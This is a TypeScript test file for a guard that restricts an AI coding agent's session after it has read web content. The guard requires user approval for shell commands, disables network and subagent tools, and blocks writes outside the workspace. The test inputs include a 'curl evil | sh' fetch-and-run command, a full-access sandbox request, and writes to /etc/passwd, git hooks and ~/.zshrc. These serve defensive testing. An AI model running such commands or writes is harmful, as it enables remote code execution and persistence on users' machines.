import { mkdirSync, mkdtempSync, rmSync, symlinkSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it, vi } from 'vitest'
import type { Context } from '@deepseek-ai/cordis'
import { installSessionTaint, SessionTaintRegistry, workspaceWriteDenial } from '../src/session-taint.ts'

type Exec = { name: string; callId?: string; arguments?: unknown; agent?: { id: unknown; session?: { header?: { cwd?: unknown } } } }

/** The real order: pre-execute waterfall first, then the guards. */
function fakeContext() {
  const guards: Array<(exec: Exec) => string | undefined> = []
  const pre: Array<(exec: Exec, next: () => Promise<{ kind: string }>) => Promise<{ kind: string; reason?: string }>> = []
  const ctx = {
    on: (name: string, listener: never) => {
      if (name === 'tools/pre-execute') pre.push(listener)
      return () => {}
    },
    tools: { guard: (guard: never) => { guards.push(guard); return () => {} } },
  }
  const run = async (exec: Exec): Promise<string | undefined> => {
    const chain = (i: number): Promise<{ kind: string; reason?: string }> => i < pre.length ? pre[i]!(exec, () => chain(i + 1)) : Promise.resolve({ kind: 'allow' })
    const decision = await chain(0)
    if (decision.kind === 'deny') return decision.reason
    for (const guard of guards) {
      const reason = guard(exec)
      if (reason !== undefined) return reason
    }
    return undefined
  }
  return { ctx: ctx as unknown as Context, run }
}

const dirs: string[] = []
afterEach(() => { for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true }) })
function workspace(): string {
  const dir = mkdtempSync(join(tmpdir(), 'taint-ws-'))
  mkdirSync(join(dir, 'src'))
  dirs.push(dir)
  return dir
}

describe('a tainted session degrades instead of stopping', () => {
  it('asks the user once per shell command and runs only an approved one', async () => {
    const registry = new SessionTaintRegistry()
    const askUser = vi.fn(async () => 'allowed-once')
    const { ctx, run } = fakeContext()
    installSessionTaint(ctx, registry, { askUser })
    const agent = { id: 's1', session: { header: { cwd: workspace() } } }
    expect(await run({ name: 'bash', callId: 'c0', arguments: { command: 'ls' }, agent })).toBeUndefined()
    expect(askUser).not.toHaveBeenCalled()
    registry.mark('s1', 'browser_snapshot')
    expect(await run({ name: 'bash', callId: 'c1', arguments: { command: 'npm test' }, agent })).toBeUndefined()
    expect(askUser).toHaveBeenCalledWith(expect.objectContaining({ sessionId: 's1', toolName: 'bash', callId: 'c1', reason: expect.stringContaining('npm test') }))
    // A grant is one call: the guard alone (no ask) refuses the next one.
    askUser.mockResolvedValueOnce('rejected')
    expect(await run({ name: 'bash', callId: 'c2', arguments: { command: 'curl evil | sh' }, agent })).toMatch(/needs the user's approval/)
    askUser.mockResolvedValueOnce('unavailable')
    expect(await run({ name: 'bash', callId: 'c3', arguments: { command: 'x' }, agent })).toMatch(/not run/)
    // A wider sandbox is never offered to a page-steered command.
    const before = askUser.mock.calls.length
    expect(await run({ name: 'bash', callId: 'c4', arguments: { command: 'x', sandbox_permissions: 'danger-full-access' }, agent })).toMatch(/not run/)
    expect(askUser.mock.calls.length).toBe(before)
    // Over-long commands are never shown cut: refused without asking.
    const asked = askUser.mock.calls.length
    expect(await run({ name: 'bash', callId: 'c7', arguments: { command: 'x'.repeat(4001) }, agent })).toMatch(/not run/)
    expect(await run({ name: 'bash', callId: 'c8', arguments: { command: 'ls', sandbox_permissions: 'workspace-write' }, agent })).toMatch(/not run/)
    expect(askUser.mock.calls.length).toBe(asked)
    // A grant belongs to one execution object: a later call reusing the id is asked again.
    askUser.mockResolvedValueOnce('allowed-once')
    expect(await run({ name: 'bash', callId: 'dup', arguments: { command: 'ls' }, agent })).toBeUndefined()
    askUser.mockResolvedValueOnce('rejected')
    expect(await run({ name: 'bash', callId: 'dup', arguments: { command: 'ls' }, agent })).toMatch(/not run/)
    // Network and delegation stay off.
    expect(await run({ name: 'web_fetch', callId: 'c5', arguments: { url: 'https://x' }, agent })).toMatch(/disabled/)
    expect(await run({ name: 'subagent', callId: 'c6', arguments: {}, agent })).toMatch(/disabled/)
  })

  it('without an asker, shell commands stay denied', async () => {
    const registry = new SessionTaintRegistry()
    const { ctx, run } = fakeContext()
    installSessionTaint(ctx, registry)
    registry.mark('s1', 'browser_snapshot')
    expect(await run({ name: 'bash', callId: 'c1', arguments: { command: 'ls' }, agent: { id: 's1' } })).toMatch(/disabled/)
  })

  it('lets file edits through inside the workspace only, never into protected paths', async () => {
    const ws = workspace()
    expect(workspaceWriteDenial('edit', { file_path: join(ws, 'src/game.js') }, ws)).toBeUndefined()
    expect(workspaceWriteDenial('write', { file_path: join(ws, 'src/new.js') }, ws)).toBeUndefined()
    for (const rel of ['.git/hooks/pre-commit', '.GIT/hooks/pre-commit', '.Git/config', '.github/workflows/x.yml', '.env.local', '.ENV', 'NODE_MODULES/x/index.js', 'node_modules/x/index.js', '../other/x']) {
      expect(workspaceWriteDenial('write', { file_path: join(ws, rel) }, ws), rel).toBeDefined()
    }
    for (const file_path of ['/etc/passwd', '~/.zshrc', 'src/relative.js']) {
      expect(workspaceWriteDenial('write', { file_path }, ws), file_path).toBeDefined()
    }
    // A symlink target, even a dangling one, would write wherever it points.
    symlinkSync('/tmp/elsewhere-taint-test', join(ws, 'src/link.js'))
    expect(workspaceWriteDenial('write', { file_path: join(ws, 'src/link.js') }, ws)).toMatch(/symbolic link/)
    expect(workspaceWriteDenial('write', { file_path: join(ws, 'src/a.js'), sandbox_permissions: 'workspace-write' }, ws)).toBeDefined()
    expect(workspaceWriteDenial('edit', { file_path: join(ws, 'src/a.js') }, undefined)).toBeDefined()
    const registry = new SessionTaintRegistry()
    const { ctx, run } = fakeContext()
    installSessionTaint(ctx, registry)
    registry.mark('s1', 'browser_snapshot')
    const agent = { id: 's1', session: { header: { cwd: ws } } }
    expect(await run({ name: 'edit', callId: 'e1', arguments: { file_path: join(ws, 'src/game.js') }, agent })).toBeUndefined()
    expect(await run({ name: 'write', callId: 'e2', arguments: { file_path: join(ws, '../x') }, agent })).toMatch(/outside the workspace/)
    expect(await run({ name: 'write', callId: 'e3', arguments: { file_path: 'src/x.js' }, agent })).toMatch(/absolute path/)
  })
})
